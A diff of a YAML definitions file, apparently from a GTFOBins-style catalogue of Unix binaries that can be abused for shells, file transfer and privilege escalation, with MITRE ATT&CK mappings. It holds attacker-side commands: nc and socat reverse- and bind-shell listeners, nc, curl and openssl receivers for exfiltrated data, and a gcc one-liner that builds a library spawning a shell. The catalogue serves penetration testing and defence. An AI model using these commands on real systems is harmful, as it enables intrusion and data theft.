@@ -1,68 +1,162 @@
----
-# this is the rendering order of functions
-
 shell:
   label: Shell
-  description: It can be used to break out from restricted environments by spawning an interactive system shell.
+  description: This executable can spawn an interactive system shell.
+  mitre:
+  - T1059
+  extra:
+    tty: &tty
+      false: The spawned shell is just a dummy REPL that can only run simple terminal commands.
+    blind: &blind
+      true: The commands are executed but their output is hidden from the attacker.
 
 command:
   label: Command
-  description: It can be used to break out from restricted environments by running non-interactive system commands.
+  description: This executable can run non-interactive system commands.
+  mitre:
+  - T1059
+  extra:
+    blind: *blind
 
 reverse-shell:
   label: Reverse shell
-  description: It can send back a reverse shell to a listening attacker to open a remote network access.
-
-non-interactive-reverse-shell:
-  label: Non-interactive reverse shell
-  description: It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.
+  description: This executable can send back a reverse system shell to a listening attacker.
+  mitre:
+  - T1059
+  - T1071
+  extra:
+    tty: *tty
+    blind: *blind
+    listener:
+      tcp-server:
+        comment: A TCP server can be used on the attacker box to receive the shell.
+        code: nc -l -p 12345
+      tcp-server-tty:
+        comment: A TCP server can be used on the attacker box to receive the shell.
+        code: socat file:/dev/tty,raw,echo=0 tcp-listen:12345
+      tls-server:
+        comment: A TLS server can be used on the attacker box to receive the shell.
+        code: |-
+          openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+          openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
 
 bind-shell:
   label: Bind shell
-  description: It can bind a shell to a local port to allow remote network access.
-
-non-interactive-bind-shell:
-  label: Non-interactive bind shell
-  description: It can bind a non-interactive shell to a local port to allow remote network access.
-
-file-upload:
-  label: File upload
-  description: It can exfiltrate files on the network.
-
-file-download:
-  label: File download
-  description: It can download remote files.
+  description: This executable can bind a system shell to a local port waiting for an attacker to connect.
+  mitre:
+  - T1059
+  - T1071
+  extra:
+    tty: *tty
+    blind: *blind
+    connector:
+      tcp-client:
+        comment: A TCP client can be used on the attacker box to connect to the shell.
+        code: nc victim.com 12345
+      tcp-client-tty:
+        comment: A TCP client can be used on the attacker box to receive the shell.
+        code: socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345
 
 file-write:
   label: File write
-  description: It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.
+  description: This executable can write data to local files.
+  mitre:
+  - T1565
+  extra:
+    binary: &binary
+      false: The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.
 
 file-read:
   label: File read
-  description: It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.
+  description: This executable can read data from local files.
+  mitre:
+  - T1005
+  extra:
+    binary: *binary
+
+upload:
+  label: Upload
+  description: This executable can upload local data.
+  mitre:
+  - T1041
+  extra:
+    binary: *binary
+    receiver:
+      tcp-client:
+        comment: A TCP client can be used on the attacker box to receive the data.
+        code: nc victim.com 12345 >/path/to/output-file
+      tcp-server:
+        comment: A TCP server can be used on the attacker box to receive the data.
+        code: nc -l -p 12345 >/path/to/output-file
+      http-client:
+        comment: An HTTP client can be used on the attacker box to receive the data.
+        code: curl victim.com -o /path/to/output-file
+      http-server:
+        comment: An HTTP server can be used on the attacker box to receive the data.
+        code: nc -l -p 80 | awk 'BEGIN {RS="\r\n\r\n";ORS=""} NR==2' >/path/to/output-file
+      ftp-server:
+        comment: An FTP server can be used on the attacker box to receive the data.
+        code: python -m pyftpdlib -w -p 21
+      ssh-server:
+        comment: An SSH server can be used on the attacker box to receive the data.
+      tls-server:
+        comment: A TLS server can be used on the attacker box to receive the data.
+        code: |-
+          openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+          openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 >/path/to/output-file
+
+download:
+  label: Download
+  description: This executable can download remote data.
+  mitre:
+  - T1105
+  extra:
+    binary: *binary
+    sender:
+      tcp-client:
+        comment: A TCP client can be used on the attacker box to send the data.
+        code: nc victim.com 12345 </path/to/input-file
+      tcp-server:
+        comment: A TCP server can be used on the attacker box to send the data.
+        code: nc -l -p 12345 </path/to/input-file
+      http-client:
+        comment: An HTTP client can be used on the attacker box to send the data.
+        code: curl victim.com --data-binary @/path/to/input-file
+      http-server:
+        comment: An HTTP server can be used on the attacker box to send the data.
+        code: python -m http.server 80
+      ftp-server:
+        comment: An FTP server can be used on the attacker box to send the data.
+        code: python -m pyftpdlib -w -p 21
+      ssh-server:
+        comment: An SSH server can be used on the attacker box to send the data.
+      tls-server:
+        comment: A TLS server can be used on the attacker box to send the data.
+        code: |-
+          openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+          openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file
 
 library-load:
   label: Library load
-  description: It loads shared libraries that may be used to run code in the binary execution context.
+  description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.
+  mitre:
+  - T1574
+  extra:
+    payload: |-
+      As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:
 
-suid:
-  label: SUID
-  description: |
-    If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.
+      ```
+      echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
+          | gcc -w -fPIC -shared -o lib.so -x c -
+      ```
 
-    This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
+      Add the usual `-p` argument to the shell for SUID contexts.
 
-sudo:
-  label: Sudo
-  description: If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+privilege-escalation:
+  label: Privilege escalation
+  description: This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable.
+  mitre:
+  - T1548
 
-capabilities:
-  label: Capabilities
-  description: If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
-
-limited-suid:
-  label: Limited SUID
-  description: |
-    If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.
-
-    This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
+inherit:
+  label: Inherit
+  description: This executable can inherit functions from another.
